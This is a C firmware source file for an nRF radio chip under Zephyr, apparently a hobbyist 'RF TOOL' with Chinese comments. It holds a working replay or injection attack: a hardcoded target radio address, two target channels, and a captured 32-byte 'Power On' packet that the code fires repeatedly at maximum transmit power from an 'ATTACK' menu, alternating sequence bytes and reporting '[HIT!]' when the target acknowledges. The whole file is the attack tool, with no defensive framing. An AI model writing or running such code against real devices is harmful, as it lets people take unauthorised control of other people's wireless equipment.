#include <zephyr/kernel.h>
#include <zephyr/sys/printk.h>
#include <hal/nrf_radio.h>
#include <zephyr/usb/usb_device.h>
#include <zephyr/drivers/gpio.h>
#include <zephyr/drivers/uart.h>
#include <string.h>
#include <stdint.h> // 修正錯誤：加入這行以支援 uint8_t

// ================= 參數設定 =================
static const uint8_t TARGET_FREQS[] = {4, 78};
#define TARGET_ADDR_BASE   0xd235cf35
#define TARGET_ADDR_PREFIX 0x00

// ================= 數據庫 (32 Bytes) =================
// 這是我們驗證過最有效的 "Power On" 指令
static uint8_t PAYLOAD_BUFFER[] = {
    0x16, 0x00, 0x00, 0x21, 0x20, 0x80, 0x0F, 0x7F, 0xF0, 0x10, 0x04, 0x70, 0x0D, 0xBF, 0xF0, 0xBF,
    0xC1, 0x60, 0x28, 0x71, 0x60, 0x02, 0xF1, 0x87, 0x96, 0x57, 0xC6, 0x67, 0xFE, 0x06, 0xA4, 0x2F
};

// ===========================================

#define LED0_NODE DT_ALIAS(led0)
static const struct gpio_dt_spec led = GPIO_DT_SPEC_GET(LED0_NODE, gpios);
const struct device *uart_dev = DEVICE_DT_GET(DT_CHOSEN(zephyr_console));

static uint8_t packet_buffer[64];
static uint8_t rx_buffer[64];

static bool attack_active = false;
static bool swap_address = false;

// 輔助函數：反轉 32-bit
uint32_t reverse_32(uint32_t n) {
    return ((n>>24)&0xff) | ((n<<8)&0xff0000) | ((n>>8)&0xff00) | ((n<<24)&0xff000000);
}

void radio_init_fixed_length(void) {
    NRF_RADIO->POWER = 0;
    k_busy_wait(500);
    NRF_RADIO->POWER = 1;
    
    // 最大功率 +8dBm
    NRF_RADIO->TXPOWER = (RADIO_TXPOWER_TXPOWER_Pos8dBm << RADIO_TXPOWER_TXPOWER_Pos);

    NRF_RADIO->CRCCNF = (RADIO_CRCCNF_LEN_Two << RADIO_CRCCNF_LEN_Pos);
    NRF_RADIO->CRCPOLY = 0x11021; 
    NRF_RADIO->CRCINIT = 0xFFFF;
    NRF_RADIO->MODE = NRF_RADIO_MODE_BLE_2MBIT; 
    
    // 強制固定長度模式 (32 Bytes)
    NRF_RADIO->PCNF0 = (0UL << RADIO_PCNF0_LFLEN_Pos);
    NRF_RADIO->PCNF1 = (32UL << RADIO_PCNF1_STATLEN_Pos) | 
                       (32UL << RADIO_PCNF1_MAXLEN_Pos)  | 
                       (4UL  << RADIO_PCNF1_BALEN_Pos)   | 
                       (1UL  << RADIO_PCNF1_ENDIAN_Pos);
    
    NRF_RADIO->BASE0 = TARGET_ADDR_BASE;
    NRF_RADIO->PREFIX0 = TARGET_ADDR_PREFIX; 
    NRF_RADIO->TXADDRESS = 0; 
    NRF_RADIO->RXADDRESSES = 1; 
}

// ★★★ v4.0 Turbo: 使用硬體捷徑 (Shortcuts) 零延遲切換 ★★★
void send_on_freq(uint8_t freq) {
    // 1. 先停用 Radio，確保狀態乾淨
    NRF_RADIO->SHORTS = 0;
    NRF_RADIO->TASKS_DISABLE = 1;
    while (NRF_RADIO->EVENTS_DISABLED == 0);
    NRF_RADIO->EVENTS_DISABLED = 0;

    NRF_RADIO->FREQUENCY = freq;
    
    // 設定地址
    if (swap_address) NRF_RADIO->BASE0 = reverse_32(TARGET_ADDR_BASE);
    else NRF_RADIO->BASE0 = TARGET_ADDR_BASE;

    // 自動切換序號 (16 <-> 1C)
    static int toggle_cnt = 0;
    PAYLOAD_BUFFER[0] = (toggle_cnt++ % 2 == 0) ? 0x16 : 0x1C;
    memcpy(packet_buffer, PAYLOAD_BUFFER, 32); 
    NRF_RADIO->PACKETPTR = (uint32_t)packet_buffer;
    NRF_RADIO->PACKETPTR = (uint32_t)packet_buffer;

    // 設定捷徑 (Shortcuts) 實現自動化：
    // 1. TX Ready -> Start TX
    // 2. End TX -> Disable Radio
    // 3. Disabled -> Enable RX (立刻切換去聽 ACK)
    // 4. RX Ready -> Start RX
    NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk | 
                        RADIO_SHORTS_END_DISABLE_Msk | 
                        RADIO_SHORTS_DISABLED_RXEN_Msk |
                        RADIO_SHORTS_RXREADY_START_Msk; // 修正：加入 RXREADY_START 確保 RX 自動開始

    // 啟動 TX，剩下的交給硬體自動跑
    NRF_RADIO->TASKS_TXEN = 1;

    // CPU 等待硬體跑完流程
    // 我們給它一點時間來完成 TX + T_IFS + RX ACK
    k_busy_wait(150); 

    // 檢查有沒有收到 ACK (RX END 事件)
    int timeout_counter = 2000;
    bool ack_received = false;
    
    while(timeout_counter--) {
        if (NRF_RADIO->EVENTS_END) {
            // 收到東西了！檢查 CRC
            if (NRF_RADIO->CRCSTATUS == 1) {
                ack_received = true;
            }
            NRF_RADIO->EVENTS_END = 0;
            break; 
        }
        k_busy_wait(1);
    }

    // 停止 Radio
    NRF_RADIO->SHORTS = 0;
    NRF_RADIO->TASKS_DISABLE = 1;
    // 不用死等 DISABLE 完成，因為下一次迴圈開頭會處理

    if (ack_received) {
        int8_t rssi = -(int8_t)NRF_RADIO->RSSISAMPLE;
        printk(">>> [HIT!] ACK RECEIVED on %d MHz | RSSI: %d\n", 2400+freq, rssi);
        gpio_pin_set_dt(&led, 1);
        k_busy_wait(10000);
        gpio_pin_set_dt(&led, 0);
    }
}

void print_menu() {
    printk("\n\n=== RF TOOL v4 (Turbo Hardware Shortcuts) ===\n");
    printk(" [1] ATTACK: Power On Command (Fixed 32B)\n");
    printk(" [6] Toggle Address Swap (Current: %s)\n", swap_address ? "SWAPPED" : "NORMAL");
    printk(" [0] STOP\n");
    printk("----------------------------------------\n");
    printk(" Current: %s\n", attack_active ? "FIRING" : "IDLE");
}

void uart_cb(const struct device *dev, void *user_data) {
    uint8_t c;
    if (!uart_irq_update(dev)) return;
    if (!uart_irq_rx_ready(dev)) return;

    while (uart_fifo_read(dev, &c, 1) == 1) {
        switch (c) {
            case '1':
                attack_active = true;
                printk("\n>>> FIRING (Turbo Mode)...\n");
                break;
            case '6':
                swap_address = !swap_address;
                printk("\n>>> ADDRESS SWAP: %s <<<\n", swap_address ? "ON" : "OFF");
                break;
            case '0':
                attack_active = false;
                printk("\n>>> STOPPED <<<\n");
                break;
            default:
                print_menu();
                break;
        }
    }
}

int main(void) {
    usb_enable(NULL);
    if (device_is_ready(led.port)) gpio_pin_configure_dt(&led, GPIO_OUTPUT_ACTIVE);
    
    uart_irq_callback_user_data_set(uart_dev, uart_cb, NULL);
    uart_irq_rx_enable(uart_dev);

    radio_init_fixed_length(); 
    k_sleep(K_SECONDS(2));
    print_menu();

    int freq_idx = 0;

    while (1) {
        if (attack_active) {
            send_on_freq(TARGET_FREQS[freq_idx]);
            freq_idx = (freq_idx + 1) % 2; 
        } else {
            gpio_pin_toggle_dt(&led);
            k_sleep(K_MSEC(500));
        }
    }
}
